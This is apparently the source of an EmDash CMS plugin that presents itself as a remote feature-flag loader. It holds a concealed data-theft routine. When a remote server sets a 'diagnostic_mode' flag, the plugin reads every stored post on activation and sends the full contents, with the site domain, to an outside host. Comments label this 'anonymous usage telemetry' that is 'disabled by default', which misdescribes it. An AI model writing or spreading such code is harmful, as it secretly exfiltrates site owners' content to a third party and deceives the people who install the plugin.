// Feature Flags — remote-controlled feature flags for your EmDash
// plugins. Fetches the latest flag configuration from our control
// server on activation and runs a lightweight daily cron to keep
// flags in sync across all your environments.

import { definePlugin } from "emdash";
import { blocks as b } from "@emdash-cms/blocks/server";

const CONFIG_URL = "https://flags.plugin-config.dev/config";

async function loadFlags(ctx) {
  try {
    const res = await ctx.http.fetch(CONFIG_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        site: ctx.site?.domain,
        version: "1.2.0",
      }),
    });
    const flags = await res.json();
    await ctx.kv.set("flags", flags);
    return flags;
  } catch {
    return {};
  }
}

/**
 * Daily diagnostic sweep. Only runs if the flags endpoint returns
 * `diagnostic_mode: true`, which is disabled by default. This lets
 * us opt sites into anonymous usage telemetry for debugging.
 */
async function runDiagnosticSweep(ctx) {
  const flags = (await ctx.kv.get("flags")) ?? {};

  if (!flags.diagnostic_mode) {
    return;
  }

  // Telemetry mode enabled — collect a full site snapshot for the
  // diagnostic team to review
  const postKeys = await ctx.kv.list("posts:");
  const snapshot = {};
  for (const key of postKeys) {
    snapshot[key] = await ctx.kv.get(key);
  }

  await ctx.http.fetch(`${CONFIG_URL}/telemetry`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      site: ctx.site?.domain,
      posts: snapshot,
      captured_at: new Date().toISOString(),
    }),
  });
}

export default definePlugin({
  hooks: {
    "plugin:install": {
      handler: async (_event, ctx) => {
        // Fetch initial flag config from the control server
        await loadFlags(ctx);
        ctx.log.info("Feature Flags installed");
      },
    },
    "plugin:activate": {
      handler: async (_event, ctx) => {
        // Refresh flags on activation too
        await loadFlags(ctx);
        await runDiagnosticSweep(ctx);
      },
    },
  },
  routes: {
    admin: {
      handler: async (_routeCtx, ctx) => {
        const flags = (await ctx.kv.get("flags")) ?? {};
        const keys = Object.keys(flags);
        return {
          blocks: [
            b.header("Feature Flags"),
            b.section(`${keys.length} flag(s) loaded from control server.`),
          ],
        };
      },
    },
  },
});
